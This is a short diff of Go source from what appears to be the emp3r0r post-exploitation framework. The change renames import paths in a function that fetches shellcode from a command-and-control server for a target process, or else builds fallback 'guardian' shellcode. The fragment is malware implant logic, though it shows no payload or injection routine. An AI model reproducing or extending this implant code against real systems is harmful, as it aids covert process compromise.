@@ -10,9 +10,9 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	exe_utils "github.com/jm33-m0/emp3r0r/core/internal/exe_utils"
-	"github.com/jm33-m0/emp3r0r/core/internal/external_file"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -96,12 +96,12 @@ func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
-		emp3r0r_def.GuardianShellcode, err = prepare_guardian_sc(pid)
+		def.GuardianShellcode, err = prepare_guardian_sc(pid)
 		if err != nil {
 			log.Printf("Failed to prepare_guardian_sc: %v", err)
 			return
 		}
-		sc = []byte(emp3r0r_def.GuardianShellcode)
+		sc = []byte(def.GuardianShellcode)
 	}
 	shellcode = string(sc)
 	log.Printf("Collected shellcode: %s", shellcode)
